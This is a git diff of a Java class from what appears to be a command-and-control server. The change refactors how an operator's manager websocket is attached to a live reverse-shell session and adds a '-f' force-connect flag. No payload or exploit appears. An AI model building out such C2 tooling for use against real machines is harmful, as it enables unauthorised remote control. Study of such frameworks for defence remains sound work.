@@ -1,4 +1,4 @@
-package com.mtattab.c2cServer.service.commands;
+package com.mtattab.c2cServer.service.commands.manager;
 
 import com.mtattab.c2cServer.model.ManagerCommunicationModel;
 import com.mtattab.c2cServer.model.MessageEventModel;
@@ -26,12 +26,11 @@ import org.springframework.context.ApplicationEventPublisherAware;
 
 @Component
 @Slf4j
-public class ConnectCommand implements Command,  ApplicationEventPublisherAware {
+public class ConnectCommand implements Command {
     @Autowired
     ActiveSessionsObservable activeSessionsObservable;
 
 
-    private ApplicationEventPublisher applicationEventPublisher;
 
     @Override
     public void execute(List<String> args, WebSocketSession currentSocket) {
@@ -39,36 +38,28 @@ public class ConnectCommand implements Command,  ApplicationEventPublisherAware 
                 activeSessionsObservable.getActiveReverseShellSessions(),args.get(1));
 
         if (targetSessionToBeConnectedTo.isPresent()){
-            connectToSession(currentSocket, targetSessionToBeConnectedTo.get());
+            connectToSession(currentSocket, targetSessionToBeConnectedTo.get(), args);
         }else {
             SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                     .msg(String.format("session '%s' not found ", args.get(1)))
                     .build()
             )));
+
+
         }
 
     }
 
-    private void connectToSession(WebSocketSession currentSocket, WebSocketSession socketToConnectTo){
-//        establish connection between two manger socket and reverse shell socket
-//        this.applicationEventPublisher.publishEvent(
-//                new MessageEventModel(this, MANAGER_TO_REVERSE_SHELL_CONNECTION, currentSocket,socketToConnectTo));
-
-        ConnectionManager.connectedManagerToReverseSessions.put(currentSocket,socketToConnectTo);
-        ConnectionManager.connectedReverseToManagerSessions.put(socketToConnectTo, currentSocket);
-
-        // send a conformation to socket current socket
-        SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
-                .msg(String.format("Connected successfuly to socket: '%s'",socketToConnectTo.getId()))
-                .build()
-        )));
-
+    private void connectToSession(WebSocketSession currentSocket, WebSocketSession socketToConnectTo, List<String> args){
+        boolean forceConnect = false;
+//        check if the force optional param is in the args
+        if (args.size() > 2 && args.get(2) !=null && args.get(2).equalsIgnoreCase("-f") ) {
+            forceConnect=true;
+        }
+        //        establish connection between two manger socket and reverse shell socket
+        ConnectionManager.connectTwoSockets(currentSocket,socketToConnectTo, forceConnect);
 
     }
 
-    @Override
-    public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) {
-        this.applicationEventPublisher = applicationEventPublisher;
 
-    }
 }
